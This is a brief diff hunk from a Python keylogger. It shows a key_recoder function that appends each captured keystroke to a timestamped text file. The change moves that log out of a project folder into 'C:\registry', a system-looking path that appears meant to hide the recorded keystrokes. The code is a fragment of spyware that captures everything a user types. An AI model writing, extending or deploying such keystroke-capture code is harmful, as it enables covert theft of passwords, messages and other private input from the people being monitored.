@@ -7,7 +7,7 @@ d= datetime.datetime.now() .strftime('%Y-%m-%d_%H-%M-%S')
 
 def key_recoder (key):
     key=str(key)
-    f= open('Proyectos\Keylogger\keyloger_ {}.txt'.format(d), 'a')
+    f= open('C:\registry\keyloger_ {}.txt'.format(d), 'a')
     if key == 'Key.enter':
      f.write('\n')
     elif  key == 'Key.space':
